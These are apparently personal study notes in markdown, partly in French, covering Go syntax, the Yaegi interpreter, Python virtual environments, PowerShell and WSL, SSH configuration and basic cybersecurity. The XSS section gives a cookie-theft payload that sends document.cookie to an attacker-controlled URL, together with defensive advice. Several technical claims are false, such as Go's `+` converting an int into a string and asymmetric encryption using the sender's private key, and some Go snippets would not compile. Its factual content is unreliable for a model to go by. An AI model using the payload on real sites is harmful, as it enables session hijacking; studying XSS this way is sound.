  * For standalone files, the package is called main, but the name of the file is decided by the programmer.
  * The `fmt` package implements formatted I/O.
  * All go files start with `package [packagename]`. When importing, one imports `path/to/package`. _Bref_, the packagename is the last element of the import path. For instance, the "math/rand" package comprises files that begin with the statement `package rand`.
- Package importation :
  * `import package` or `import path/to/package`
- Variables must be declared before being assigned.
  * Either declared and assigned in one go :
    + `var f = 5`
    + `var g int = 5`
    + `var j, k = false, 5`
    + `var l, m bool = false, true`
  * Or, declared, and then assigned (they can be declared outside functions and assigned in a function)
  * ```go a
    var (
      b bool
      c float32
      d string
    )
  
    b, c = true, 32.0
    ```
  * Or declared and assigned in one go using the `:=`constructor :
    + `e := 5`
    + `h, i := true, "indeed"`
  * Note that **outside a function, every statement begins with a keyword** (var, func, and so on) and so the := construct is not available.
- When a variable is declared it is assigned the natural "null" value of the corresponding type. 
  * For example, `var k int` assigns k to the value `0`
  * `var s string` assigns s to the value `""`.
- Declaring and assigning values :
  * `var x = 5`
- Go handles a short variable declaration, without keyword : 
  * `k := 3`
  * Note that **outside a function, every statement must begin with a keyword** (var, func, ...). The `:=` construct is hence not available.
- Available types include :
  * `uint8`
  * `uint16`
  * `uint32`
  * `uint64`
  * `int`
  * `int8`
  * `int16`
  * `int32`
  * `int64`
  * `float32`
  * `float64`
  * `complex64`
  * `complex128`
  * `bool`
  * `string` (UTF-8)
- `int` is `int32` on 32-bits systems, and `int64` on 64-bits systems. 
- The Go documentation says to use `int` unless you have a specific reason to use a fixed-size `intXX` type. 
- Aliases :
  * `byte` is an alias for `uint8`
  * `rune` is an alias for `int32`
  * `int` is an alias for `int32` on 32-bits systems, and `int64` on 64-bits systems. 
- Not unsigned (i.e., signed) int types use two's complement. 
  * In particular, on 64-bits systems, 
  * Note that the bitwise left-shift (`<<`) operator doesn't let you shift until you reach the right-most bit that's supposed to represent the sign. 
  * i.e., on 64-bits systems for instance, `1<<63` does not work, although it could yield $-2^63$.
  * This is likely for security reasons (doesn't let you do something that would yield something you didn't expect).
- The Go compiler isn't happy when you declare variables that aren't used...
- But it will let you declare functions without using them.
- `fmt.Printf()` allows to print formatted text to standard output, just like `printf` in C.
  * It uses _verbs_ : `fmt.Print("The value of x is : %d",x)`
  * Go _verbs_ include :
    + `%v` : The value in a default format
    + `%+v` : Same as `%v`, but adds field names when printing structs
    + `%#v` :  a Go-syntax representation of the value
  (floating-point infinities and NaNs print as ±Inf and NaN)
    + `%T`: a Go-syntax representation of the type of the value : `int`, `float64`...
    + `%%` : The way to write a percent `%` sign (without it being interpreted as a verb attempt)
    + See more in our breakdown of the [fmt](#fmt) package.
- `fmt.Println()` allows to print stuff without bothering with `%T`, `%d`...
```go
package main

import "fmt"

/* Declare a single variable */
var a

/* Declare a group of variables */
var (
    b bool
    c float32
    d string
)

func main() {
  a = 42                  // Assign single value
  b, c = true, 32.0       // Assign multiple values
  d = "string"            // Strings must contain double quotes

  e := 5                  // Declare and assign a variable in one go

  const f = 2            //
  x, y := true, false  // bool


  fmt.Println(a, b, c, d) // 42 true 32 string
}
```
- **Exported names** : As said before, variables, types, and functions declared in a file associated to a package `package` are visible among other source files within the same package. This is actually only partially true : it is only true for **exported names**. Exported names are the names that start with a capital letter. Exported names will be seen from other source files in the same package. For instance, `import "math"` allows to write `math.Pi` to display the value of $\pi$, but `math.pi`won't work.
- Functions are declared like so :
  * ```go
    func add(x int, y int) int {
      return x + y
    }
    ``` 
- Note that the types are after each argument variables, and the return type of the function (if any)(i.e. : if the function returns something - if the function does not return anything, then nothing shoud be written between `(...args...)` and `{ ... }` is after the arguments of the function.
- It is possible to omit the types of some consecutive variables that have the same type but indicating their type only at the last one :
  * ```go
    func mul(x, y int, s string) int {
      fmt.Println("Multiplying", x, "and", y, "together. Additional message :", s)
      return x*y
    }
    ```
- If the function returns several values (as a tuple), the return type should be indicated as follows :
  * ```go
    func swap(int x, string s) (string, int) {
      return s,x 
    }
    ```
- **Naked returns**
  * If you see a `return` at the end of a function... that's _naked_, i.e. just a `return` without anything right after it (not `return ...`, just `return`), it's a _naked return_. In this case, the return values are specified where the function return value types are specified (at the very beginning, between `(arguments)` and `{code}`). The return variable names are then specified there, and a naked return is possible :
  * ```go
    func split(sum int) (x, y int) {
      x = sum * 4 / 9
      y = sum - x
      return
    }
    ```
  * Naked return statements should be used only in short functions, as with the example shown here. They can harm readability in longer functions.
  * Don't forget the parenthesis, otherwise the Go compiler doesn't accept it. 
  * When doing this, the variable is (pre-)declared. You can affect it (so don't re-declare it).
  * ```go 
    func split(sum int) (x int) {
    x = sum * 4 / 9
    return
    }
    ```
- Operators : 
  * `+`, `-`, `*`
  * If one of its arguments is a `string`, `+` will automatically cast its other argument into a string and concatenate them (as strings). Example : `5 + "i"` returns the string "5i".
  * The `/` operator rounds up **towards zero**, if both arguments are `int`s, otherwise it'll be a float) : `-1/2` returns 0, `0.5/2` returns `0.25`
  * The bitwise left shift `<<` (and the bitwise right shift `>>`) do what we expect they do.
  * Not that for all int types (recall that all int types are fixed-sized, somethimes signed using two's complement, sometimes not)
- Type conversions : 
  * The expression `T(v)` converts the value `v` to the type `T`.
  * Example : `r := float64(5)`
- Type inference : 
  * When the types aren't statically precised, they are inferred. 
  * Examples :
    + `i := 42` defines an `int`
    + `f := 3.142` defines a `float64`
    + `g := 0.867 + 0.5i` defines a `complex128`
    + Recall that `fmt.Printf("v is of type %T\n", v)` will print the type of `v`
- Constants
  * Constants are declared using the `const` **before** the variable.
  * `const x = 5`
  * Constants can be character, string, boolean, or numeric values.
  * Constants cannot be declared using the := syntax.
  * Constants can also be declared in groups, as with `var`, like so : 
  * ```go
    const (
        a int = 5
        b     = "a"
      )
    ```
- Go supports chain commands separated by semicolons : 
  * `x := 0 ; x++ ; fmt.Println(x) ; x++ ; fmt.Println(x)`
- You can "manipulate" integers that are over $2^63$ in `consts`.
  * You can define `const big = 1<<100` and even `const big 1<<100 + 1`.
  * But once defined, constants cannot be edited. 
  * Doing this, the `const` **does not have a type**. It is an **untyped const**.
  * You cannot cast them as `int`s because of overflow. 
  * You cannot `Println` them beccause that requires to convert the `const` to have a type.
  * You can cast them as `float64`s because... idk why, but it works. It will yield a float of the type `1.2676506002282295e+29`.
- For statements : 
  * ```go
    for n := 0; n <= 10; n++ {
        fmt.Println(sum_of_squares(n))
      }
    ```
  * The first and last statements are optional !
  * ```go
    sum := 1
    for ; sum < 1000; {
      sum += sum
    }
      * But at that point... This is just a while loop. You can drop the semicolons !
    ```go
    sum := 1
    for sum < 1000 {
      sum += sum
    }
    ```
  * Hence, `for` is go's spelling of `while` loops.
  * You can even do "while true" loops by ommiting everything !
  * ```go
    for {
    }
    ```
- If statements 
  * They can, but need not to, have curly braces arount their condition, and require curly braces.
  * ```go
    if n >= 0 {
      return true
    }
    ```
  * It is possible to add a short statement before the `if` condition. Variables declared in the statement will only exist in the scope of the `if`.
  * ```go
    if v := math.Pow(2, 10); x < v {
      return true
    }
    ```
  * Add an `else` like so :
  * ```go
    if v := math.Pow(2, 10); x < v {
      return true
    } else {
      return false
    }
    ```
  * Variables declared inside an if short statement (i.e. in the short statement between the `if` keyword and the short statement condition) are also available inside any of the else blocks.
- Switches
  * They work like so
  * ```go
    switch p := n; p {
      case 0:
        fmt.Println("aa")
        return true
      case 1:
        return true
      default:
        return false
      }
    ```
  * You can write short statements as in `if`s, as seen earlier.
  * Note that it's kinda weird that Go suddently uses colons to indicate the content of the `case`s, while still using curly braces for `if`s, `for`s... ¯\_(ツ)_/¯
  * Note that `switch true` allows to write long if-elif-elif chains :
  * ```go
    t := time.Now()
    switch true {
    case t.Hour() < 12:
      fmt.Println("Good morning!")
    case t.Hour() < 17:
      fmt.Println("Good afternoon.")
    default:
      fmt.Println("Good evening.")
    }
    ```
  * This tests every condition and runs the appropriate one. _Bref_, this is a is-elif-elif chain.
  * Hence, in this `true` can be ommited : `switch {...}` is the same as `switch true {...}`
  * ```go
    t := time.Now()
    switch {
    case t.Hour() < 12:
      fmt.Println("Good morning!")
    case t.Hour() < 17:
      fmt.Println("Good afternoon.")
    default:
      fmt.Println("Good evening.")
    }
    ```
- Defers
  * The `defer` keyword defers (this means : postpones) the execution of a function to after the current function returns.
  * The deferred call's arguments are evaluated immediately, but the function call is not executed until the surrounding function returns.
  * ```go
    func main() {
      defer fmt.Println("world")

      fmt.Println("hello")
    }
    ```
  * When having several `defer`s, their function calls are pushed onto a stack.
  * Hence, they will be executed in reverse order.`
  * ```go
    func main() {
      fmt.Println("counting")

      for i := 0; i < 10; i++ {
        defer fmt.Println(i)
      }

      fmt.Println("done")
    }
    ```
- Pointers
  * The type `*T` is the type "Pointer to a value of type `*T`"
  * The `&` operator returns a pointer to its operand.
  * i.e., if `x` is anything, `&x` will return a pointer to `x`.
  * The `*` operator returns the pointer's underlying value.
  * i.e., if `x` is _a pointer_, `*x` returns the value `x` points to.
  * This is known as "dereferencing" or "indirecting".
  * Unlike C, Go has no pointer arithmetic.
  * By definition, if `p` points to `x`, it changes pretty much nothing to manipulate `*p` or `x` (whether it be in reading access or writing access)
- Structs
  * A struct is a collection of fields. If is analoguous to the constructuon `type` in OCaml.
  * Example : 
  * ```go
    type Vertex struct {
      X int
      Y int
    }

    fmt.Println(v := Vertex{1,2},v.X,v.Y)
    v1 = Vertex{1, 2}  // has type Vertex
    v2 = Vertex{X: 1}  // Y:0 is implicit
    v3 = Vertex{}      // X:0 and Y:0
    p  = &Vertex{1, 2} // has type *Vertex
    fmt.Println(v1,v2,v3,p,*p)
    ```
  * If you have a pointer `p` to a struct `v`, you can access the fields of `v` with `(*p).field`.
  * This is kind of cumbersome. Hence, Go allows to access these using `p.X`, without explicit dereference.
- Anonymous structs
  * It is possible to use anonymous structs, i.e., structs that don't have a name.
  * ```go
    z := struct {
      i int
      b bool
    }{2, true}
    ```
  * i.e., these are structs, but not defined in the standard way seen just above. 
  * They are defined and used in-place ; they don't have a name. 
  * A inline version is possible, but you have to add a semicolon between the fields to replace the carriage return.
  * `z := struct {x int; y bool}{2, true}`
  * `z := struct {x int; y bool}{x: 2, y: true}`
  * `z := struct {int; bool}{2, true}`
- Arrays
  * The type `[n]T` is an array of n values of type `T`.
  * Declaration and initialization go as follows : 
  * ```go 
    var a [3]int 
    var b [3]int = [3]int{1,2,3}
    var c = [3]int{1,2,3}
    d := int[3]{1,2,3}
    ```
  * `a[i]` then accesses the i-th element of `a`.  
  * An array's length is part of its type, so arrays cannot be resized. Slices offer a dynamic solution to this problem/
  * You can get the length of an array with `len(arr)`.
- Slices 
  * An array has a fixed size. A slice, on the other hand, is a dynamically-sized, and flexible. In practice, slices are much more common than arrays.
  * The type `[]T` is a slice with elements of type `T`.
  * A slice is build from an array, by taking a slice of it :
  * ```go
    primes := [6]int{2, 3, 5, 7, 11, 13}
    var s []int = primes[1:4]
    ```
  * Slices are _references to arrays_, in the sense that changing the elements of a slice modifies the corresponding elements of its underlying array. 
  * Other slices that are built from the same underlying array will be impacted.
  * A slice does not store any data, it just describes a section of an underlying array.
  * When slicing, one can omit the lower or higher bounds.
  * `a[0:length of a]`, `a[:length of a]`, `a[0:]` and `a[:]` are equivalent.
- Slice literals
  * `[3]bool{true, true, false}` is an array.
  * `[]bool{true, true, false}` creates the same array as above, then builds a slice that references it.
  * So, slice literals are arrays without the length.
- Reslicing slices
  * The length of a slice is the number of elements it contains.
  * It is obtained with `len(s)`.
  * The capacity of a slice is the number of elements in the underlying array **counting from the first element in the slice**.
  * It is obtained with `cap(s)`
  * ```go
    s := []int{2, 3, 5, 7, 11, 13}
    s = s[:0] // Slices the slice to give it zero length.
    s = s[:4] // Extends its length.
    s = s[2:] // Drops its first two values.
    ```
- Nil slices
  * The zero value of a slice is nil.
  * A nil slice has a length and capacity of 0 and has **no underlying array**.
- Dynamically sized slices
  * Slices can be created with the built-in `make` function. 
  * This allows to create dynamically-sized arrays.

### fmt

Printf, all %... verbs
Println, \n  support

### math

MaxInt uint64     = 1<<64 - 1
z      complex128 = cmplx.Sqrt(-5 + 12i)

#### math/cmplx

math.Sqrt(x)
Sqrt(-2)
Sqrt(-5 + 12i)

#### math/rand

rand.Intn(10)
Mod
Power

#### time

today := time.Now().Weekday()
time.Saturday 
today + 0:
today + 2:

### Go interpreters 

#### Yaegi

- Yaegi is a Go interpreter made my [Traefik Labs](https://github.com/traefik/yaegi).
- Yaegi stands for "Yaegi is Another Elegant Go Interpreter". :O
- It can have some bugs (but not too much, at least not for a simple usage of Go.
- **Installation :**
  * As a Go package
    + `import "github.com/traefik/yaegi/interp"`
  * As a Command-line executable
    + `go install github.com/traefik/yaegi/cmd/yaegi@latest`
    + Or `sudo apt install yaegi`
    + Note that you can use `rlwrap` (install it `apt` or any other package manager), and alias the `yaegi` as `rlwrap yaegi` in `~/.bashrc`, to have history and command line edition.
    + Otherwise the history won't be accessible.
  * For CI integration
    + `curl -sfL https://raw.githubusercontent.com/traefik/yaegi/master/install.sh | bash -s -- -b $GOPATH/bin v0.9.0`
- The go interpreter command prompt is... kinda shitty by default 
  * (unable to use arrow keys, no command history...)
  * Use rlwrap to bypass this issue :)
- It doesn't always work quite well. 
  * Try compiling the following code
  * ```go
      primes := [6]int{2, 3, 5, 7, 11, 13}
      var s []int = primes[1:4]
    ```
  * And then try to interpret it with yaegi. 
  * ...it doesn't work.

### Echo web framework

- https://github.com/labstack/echo
- https://echo.labstack.com/
- https://echo.labstack.com/docs/quick-start

## Python 

### Python virtual environments

```
python3 -m venv .venv (on signale qu'on utilise un module depuis python)
source .venv/bin/activate

pip install ..., pip install ..., ...
```
Use `deactivate` to exit the venv

## Windows

### Windows Powershell

- Variables d'environnement
  * Pour afficher une variable d'environnement, par exemple (au hasard) PATH : `echo $env:path`
  * Pour toutes les afficher : `gci env:`, ou `ls env:` (`gci` est l'alias de `Get-ChildItem`, comme `ls`)
- `systeminfo` sur Windows pour avoir des informations sur le système
- Infinite loop in PowerShell : `while ($true) { DoStuff } `
- Infinite loop in `cmd` (or batch script) : `for /l %n in (1,0,10) do (DoStuff)` for instance (for loop, from 1, to 0, with increment 10)(lol)
- Shutting down :
  * `shutdown | shutdown /?`  to show help
  * `shutdown /t 0` to shutdown now
  * `shutdown /r` to reboot
  * `shutdown /r /t 0` to reboot now
  * `shutdown /a` to cancel planned shutdown

### WSL

- To activate (or [install](https://learn.microsoft.com/en-gb/windows/wsl/install)) [WSL](https://learn.microsoft.com/en-us/windows/wsl/setup/environment) : 
  * `wsl --install` in a Powershell.
  * Reboot. If a text apprears, it means that WSL is already active (go to next step)
  * `wsl --list --online`, or `wsl -l -o.` : display list of available distributions
  * `wsl --install -d Ubuntu` or `wsl --install -d Debian` for instance to install a specific distribution.
  Note : If `wsl --install` displays a help message, specify the distribution (according to what has just been said)
  * In case of errors :
    - `wsl --set-default-version 2` sets up WSL's default version to WSL _2_, which can get it to work
    - `wsl.exe --update` updates WSL
    - [Install manual](https://learn.microsoft.com/en-gb/windows/wsl/install-manual)
- WSL is very cool, _except_ for computer notworking. Use (actual) Linux.
- More generally, networking on Windows is shitty. 
  * The Windows Firewall is unmanageable and has uncontrollable and unpredictable behaviour. 
  * Use Linux.
- On windows, by default, the WSL executable is stored in `C:\Program Files\WSL\wsl.exe`. 
  * This means that you can also open WSL from a PowerShell by typing `wsl`. (actually, `C:\Program Files\WSL` is not in the PATH - not in mine at least, I don't know how it works)
  * If you run `wsl` from PowerShell
  * The Windows file system is mounted in WSL in `/mnt/c`. 
  * Conversely, you can access the WSL file system from Windows :
    + Either from the file explorer by clicking on Linux in the left panel in the windows file explorer 
    + Either from Powershell, by running `cd \\wsl$\Distro`
    + Recall that all available distributions are lookupable by running `wsk --list` or `wsl --list --running` 
    + (some sources quote the first, some quote the second, I suspect the first (option) is sufficient and that the second is useless)
    + Here by available distribution we really mean distros that are currently installed on WSL. 
    + It is possible to have several distributions installed (in WSL) on a given Windows installation.
- You can run `explorer.exe` from WSL. :o
  * More generally, every Windows Path environment variable if 
  * It seems that these these aren't automatically updated (synced) in WSL from Windows (i.e., adding/removing a environment variable in Windows, does not add/remove it from WSL)
  * But anyway, you can run any command available in the Windows PowerShell in WSL - but you have to use it in the form `executable.exe` ! 
  * (obviously, otherwise, it won't work : it'll search for a command in WSL - i.e., an executable file, in the PATH, the name of which is `command` - rather than `command.exe`.)
  * (_Bref_, the difference here is that Powershell interprets `command` as a search for `command.exe` while linux only searches an executable file the name of which is `command`)
- You can run a wsl instance (terminal) from PowerShell using the command `wsl`. 
- You can run a Powershell instance (terminal) from WSL by running `powershell.exe` which is located in `/mnt/c/Windows/System32/WindowsPowerShell/v1.0/` : `/mnt/c/Windows/System32/WindowsPowerShell/v1.0/powershell.exe`.
- You can also run Powershell commands in Linux (WSL) scripts, by `source`-ing such command : `/mnt/c/Windows/System32/WindowsPowerShell/v1.0/powershell.exe "code 'C:\Users\willi\Documents\_La vie\Computers\Go'"`
- This is particularly useful for running VSCode on the Windows file system instead of WSL's. As a matter of fact, doing the latter is slower.
- You can run a wsl instance (terminal) from PowerShell using the command `wsl`. 
- You can run a Powershell instance (terminal) from WSL by running `powershell.exe` which is located in `/mnt/c/Windows/System32/WindowsPowerShell/v1.0/` : `/mnt/c/Windows/System32/WindowsPowerShell/v1.0/powershell.exe`.
- You can also run Powershell commands in Linux (WSL) scripts, by `source`-ing such command : `/mnt/c/Windows/System32/WindowsPowerShell/v1.0/powershell.exe "code 'C:\Users\willi\Documents\_La vie\Computers\Go'"`
- This is particularly useful for running VSCode on the Windows file system instead of WSL's. As a matter of fact, doing the latter is slower.

### Windows miscellaneous information

- Open the Run Command dialog (`WIN+R`) and type `shell:AppsFolder`to get a pretty exhaustive list of installed apps/softwares on the OS. Very useful for setting up a shortcut to open them (WhatsApp for instance) ! Create a shortcut, `sh.lnk` for instance, place it somewhere accessible from the PATH environment variable (`~` for instance) and typing `sh` in the Run Command dialog (`WIN+R`) will open it !
- Paint is opened with the `mspaint.exe` executable file located in ` C:\WINDOWS\system32`, which is in the PATH environment variable : `WIN+R` and `mspaint` opens it.
- If, especially when trying to backup, some folders like Pictures, Videos, Documents... don't appear in the `~`, they may be in `~/OneDrive` (i.e., OneDrive has been configured on this hard drive)! (cf. Adventures with Paola and her hard drive)

## SSH

### How SSH works

- Cryptography (in general) must ensure the three following fundamental principles : 
  * **Authenticity** : The person who talks _is indeed_ who they pretend they are. No one can steal anyone's identity.
  * **Confidentiality** : The message is encrypted and sent publicly, with anyone being able to catch it, hear it, having access to it and being able to read it, but no one except the intended recipient is able to decipher it.
  * **Integrity** : The message recieved _is ideed_ (exactly) the one sent. No transmission errors, or channel attacks, can happen.
- SSH provides ability to communicate to distant machines (often servers) in a totally secure and encrypted manner.
- SSH relies on the **asymmetric encrypting** principle. This principle is described as follows :
  * Alice and Bob want to communicate. Alice has a private-key public-key pair (and so does Bob, if Bob wants to communicate back).
  * When sending a message to Bob, Alice encrypts it using her private key.
  * Then, Bob can decypher it using **Alice's public key**
- Hash maps are created such that : 
  * Only the person who has the private key can encrypt a message that can be decoded using their public key.
  * Consequently, since the private key is kept private (and only if the private key was able to be kept private), if Bob is able to decrypt a message using Alice's public key, then he can be certain that it is indeed Alice who encrypted it : in other words, that the message was indeed sent by Alice.
  * Note : Mathematicallt, the private and public keys play symmetric roles. It could theoretically be possible to swap them. The fact that the private key is kept private is what breaks the symmetry, in terms of usage : the fact that the private key is kept private ensures **Authenticity**.
- This way, SSH ensures **authenticity** of encrypted data. 
- Confidentiality and Integrity are implemented simultaneously, and (simultaneously) also ensured by SSH.
- SSH uses TCP port 22.
- If (on WSL for instance) ssh tells you that it doesn't have the permissions to use the key (or thinks you're not the real owner), use `chmod 600 ~/.ssh/privatekay` (and `chmod 600 ~/.ssh/publickey`, tant qu'on y est) to open the permissions.
- We call **ssh client**, or **ssh client program**, the program that runs on your machine and manages ssh.
- For instance, OpenSSH is a ssh client (an implementation of SSH). PuTTY is another one (but, lol.).
- SSH uses a program called `ssh-agent`.
  * SSH client programs (`ssh` from OpenSSH. Or PuTTY, lol) typically run for the duration of a remote login session. 
  * They and are configured to look for the user's private key in a file in the user's home directory (~/.ssh/...).
  * For more security, the private key is stored in an encrypted form, and the key's password is used to compute decypher the private key.
  * So, to sum it up, the private key that's stored on disk is not the actual private key, it's an encrypted version of it, and the key's password is necessary to retrieve the decrypted key.
  * The problem with that is that, without anything else, the user would have to type it's key password each time a packet is sent.
  * That would be annoying. A solution could be to store the unencrypted key in memory, in a space associated to the space to the ssh client process.
  * This would imply that the key would've to be typed each time it's needed.
  * People weren't happy with that, they wanted it to last for longer, and not have to type it all the time. 
  * So, they needed a separate process to manage this. `ssh-agent` is such program. 
  * `ssh-agent` communicates with the SSH Client to provide the unencrypted key each time its needed.
  * For this, the client uses Unix domain socket, i.e., a (Berkeley) socket that allows data to be exchanged between two processes executing on the same (Unix or Unix-like) host computer.

### SSH usage

- `ssh -i "~/.ssh/privatekey_filename" user@[IPv4 or IPv6 address, or domain name]`
- `ssh -i "~/.ssh/privatekey" user@hostname -J -i "~/.ssh/privatekey" user@ssh-bridge`
( u)
- Note : if something doesn't work, check that you have specified a private key (and that it's the right one)
- When using an SSH bridge, both what is sent by you to the ssh bridge _and_ what is sent by the ssh bridge to the desired distant host are encrypted with your private key. Actually, the private keys can be configured to be different (just set different keys in the command), but the ssh bridge will not use any key located on their storage. You must specify (and give) both keys.
- The **authorized_keys** file : 
  * It is located in `~/.ssh/`, on the appropriate user (there is one per user, it will correspond to the user you connect to when you use `user@host`)
  * It lists all public keys that are allowed to connect to the server (to the host (machine) and user concerned).
  * You typically have to contact the server administrator for him to add your public key in this file for you to be able to connect.
- The **known_host** file : 
  * It is located in `~/.ssh/`, but (typically) on _your_ machine.
  * It lists _public-key_-_ip address_ pairs, to avoid man-in-the-middle attacks (in the form of hashs computed using the SHA256 (or another) hash map)
  * When a machine connects to an IP address for the first time, the terminal (OpenSSH) tells something like : "Are you sure you want to connect to this host ? Here is (a hash of) the remote host's public key". The idea is that you should then contact the server administrator to make sure this fingerprint is actually the one of the server you want to connect to : to avoid a man-in-the-middle attack, i.e. to avoid connecting to the wrong remote host. 
  * In practice, no one does that. We just type "yes". 
  * The _public-key_-_ip address_ pair (a hash of it, actually) is then stored in the `known_host` file. (It adds one line to the file, the fact that they are paired is made by the fact that they are on the same line). 
  * Your machine then knows that this remote host is trustworthy and it won't ask this a second time.

### SSH Config files

- An SSH config allow to win time by pre-configuring some SSH parameter to connect to distant servers quicker without having to write the same command over and over again.
- An SSH config must be written in a (text) file, either :
  * named `config` and located in `~/.ssh/`
  * or named `ssh_config` and located in `/etc/ssh/ssh_config` (on Linux)
- Example :
```
Host ssh.enst.fr
  Hostname ssh.enst.fr
  User driot-23
  IdentityFile ~/.ssh/ed

Host bulledev
  Hostname bulle-ssh.rezel.net
  User dev
  IdentityFile ~/.ssh/ed
  ProxyCommand ssh -W %h:%p ssh.enst.fr

Host bulle
  Hostname bulle-ssh.rezel.net
  User root
  IdentityFile ~/.ssh/ed
  ProxyCommand ssh -W %h:%p ssh.enst.fr

Host pace
  Hostname 137.194.13.180
  User root
  IdentityFile ~/.ssh/ed
```
- Uppercase first letters are mandatory.
- `Hostname`, `User`, `IdentityFile` are self-explanatory...
- `ProxyCommand` specifies the command to use to connect to the server. (...)
  * The command string extends to the end of the line, and is executed using the user's shell ‘exec’ directive to avoid a lingering shell process. (...)
  * `ProxyCommand ssh -W %h:%p ssh.enst.fr` can be used to automate the connection to a SSH bridge. (What does -W do though ?)(...)
- ProxyJump too, but easier. 
  * `ProxyJump user@host:port`
- `ProxyCommand` and `ProxyJump` accept [TOKENS](https://man.openbsd.org/ssh_config#TOKENS) :
  * `%h` : will be replaced by the Host
  * `%n` : will be replaced by the original remote hostname, as given on the command line.
  * `%p` : will be replaced by the remote Port.
  * `%r` : will be replaced by the remote Username.
  * `%%` : will be replaced by `%`
  * ProxyCommand and ProxyJump do not accept any other [TOKENS  described by the Documentation](https://man.openbsd.org/ssh_config#TOKENS)
  * There exists other tokens.
- **Documentation** : 
  * https://man.openbsd.org/ssh_config
  * https://man.openbsd.org/ssh_config#ProxyCommand

### SCP

- Usage : 
  * `scp -i "path/to/key" user@[IP Address]` (Brackets are optional)
  * `scp -i "path/to/key" [filename | path/to/filename] user@[IP Address]:desired/path/to/file` (First brackets are unnecessary (maybe even command-breaking), second brackets are mandatory)(Also, it is possible to change the filename in the process : `desired/path/to/newfilename.fileextension`. In other words, `file` can be different from the original filename (the new file created will then have this name). Specifying no file name (that is, `desired/path/to/file/`, with the path **ending in a `/`**) will keep the file name)
  * **To copy (whole) directories** : `scp (-i ...) -r foolder/* root@pace-lxc.rezel.net:~/`. The `*` wildcard is optional.
- SHA256 (et SHA512, SHA1, ...) sont des fonctions de hashage.
- **authorized_keys** : C'est le fichier, situé dans `~/.ssh/` d'un serveur, qui dit les clés publiques qui sont autorisées à se connecter à un certain user. 
  * Un client peut se connecter à un serveur en SSH au user `utilisateur` si (et seulement si) sa clé publique se situe dans le `authorized_keys` de l'utilisateur, autrement dit dans le fichier `/home/utilisateur/.ssh/authorized_keys`. 

## Cybersecurity

### Metadatas

- `meta2go`, `exiftool`, `aperisolve`, ... Are tools that are able to extract metadatas.
- `www.dcode.fr` propose un détecteur de code, qui tente de trouver le code qui a choffré un truc. 

### Cross-site scripting (XSS)

- XSS Means cross-site scripting. Yes, the acronym does not work...
- The goal of a XSS breach is to get the cookies of an administrator of a web page. This is done by getting a cookie, which acts like an access token.
- Example : When typing "Foobar" in a the Google seach engine, the word "Foobar" appears in the web page source code. More generally : if there is an input on the page that reads text, and if it turns out that this code gets written directly on the HTML, you can inject stuff on the HTML... JavaScript `<script></script>` tags for instance, that can run code !
- Context is the crucial point : The text could be inserted as raw HTML code, inside HTML tags attribute, or inside JavaScript code.
- To detect XSS : List all user inputs, and try to see them being reused (reflected, written directly) on the page 
- To exploit an XSS breach : 
  * You would, typically, insert the following JavaScript Code : `document.location.replace(CONTROLLED_URL+document.cookie)`
  * This code will, when executed in a browser, replace the cuurent URL the browser is into by the URL `CONTROLLED_URL+document.cookie`.
  * Here, `CONTROLLED_URL` is an URL you control, i.e. that you can choose.
  * Typically, you would use a website like `Pipedream` or **`Requestcatcher`** (Requestcatcher is better) that gives you an URL (which you (partially) choose, like `hiimsteve.requestcatcher.com` and prints you the requests that are sent to that URL. 
  * Adding `document.cookie` adds the cookies of the person that get trapped in the XSS breach !
- Reflected XSS
  * In this case, the malicious code is executed locally on the admin's machine.
  * The attacker sends to the admin a webpage with a malicous payload. Typically, what we mean by payload is URL of the form `www.website.com/.../[URL encoded payload]` : that is, adding a payload means adding something to the URL. 
  * The admin must then click on the link. This is basically fishing : the admin must click on the link...
  * The admin will then visit (his own !) web page, connected with his account. His (own !) server will respond ot him (with his admin cookie).
  * The malicious payload will then be executed (on his own machine), and will send his cookie to the attacker.
- Stocked XSS
  * In this case, the malicious code is stocked on the distant server. Hence, all users that will load the page will be victims of the attacker !!
  * This is done by injecting code on the website ; this requires the website to allow this. Typically, this happens on a forum, on which people can post text ; or comments (like on YouTube), ...
  * Any people visiting the website will then request the webpage. The malicious is executed on their machine, and send the informations (cookies...) to the attacher.
- For payloads, code to be injected, there are many ressources online that list possible payloads and stuff :
  * [Hacktricks](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting)
  * [XSS Cheatsheets](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
  * Payloads on git
    + https://github.com/payloadbox/xss-payload-list/blob/master/Intruder/xss-payload-list.txt
    + https://github.com/payloadbox/xss-payload-list 
  * Searching a little bit often gets you what you need
- Protection against XSS
  * The most powerful one : Encoding data
  * That is, replacing `<` by `&lt;` and `>` by `&gt;`. This works well because data ecryption in HTML was done precisely to prevent XSS vulnerabilities.
  * Filtering data : If a user writes `<script>` in a text form... He is likely fouting himself of your gueule : prevent them from writing stuff like this in text boxes
  * Validation : A text box that is supposed to recieve a phone number should stop anyone from writing anything else than digits for instance ;
  * CSP : complicated, we'll see that later
- To put payload into URLs, you must use URL encoding : `urlencoder.org`. This can also be used for URL decoding. More generally, to inject text into URLs, you must encode things into the right "URL format". Otherwise things dont work. 
- The `eval()` function in JavaScript is very dangerous in terms of security. Avoid it (voire : banish it).

### Cryptography

Cryptography is about protecting and piercing secrets. Cryptography algorithms use keys to encrypt messages.
- **Symmetric cryptography** :  Both people who want to talk share the same secret (the same key). 
  * Information symmetry
  * Security depends on key exchange process + encryption algorithm
  * It is faster, but less secure : hence, needs bigger keys. It is hard to scale up (taking bigger (prime) numbers isn't enough, you need more work for things to work out)
- **Asymmetric cryptography**
  * Both people don’t share the same secret (they have different keys)
  * It is more secure, but slower. 
  * Most commonly used schemes are broken by quantum-computers
- In both cases, base principles of cryptography include : 
  * The fact that the "secret" should never be the cyphering method itself.
  * I.e, the security should never rely on the fact that people _do not know_ what the cyphering method is.
  * I.e., and this is what's done in all real use-cases, the cyphering method should not be secret :
  * The secret is then something else, typically such as a (secret) key that only the users know, that's impossible to guess, reverse-engineer, and bruteforce.
  * It is clearly way too dangerous to rely on a "secret" cyphering method : there could be attacks : for instance, Caesar's encryption is easily breakable using statistical methods. 
  * An attacker could try several options and there would be a risk.
  * Unless there'd exist at least $10^20$ encryption methods to choose from, having a un-bruteforce-able key is much better.

#### Symmetric cryptography

Data is encrypted and decrypted with the same key (and the same algorithm)
It works with a function : $ s : (\mathrm{key},\mathrm{message}) \to s(\mathrm{key}, \mathrm{message}) $ and a key.
- Substitution method
  * Sherlock Holme's alphabet : choose another alphabet, i.e. a bijection between the latin alphabet and another set of symbols ; then write the message using the other alphabet.
- Caesar's encryption is a particular case of symmetric cryptography (where the key is a single number : "5", for instance).
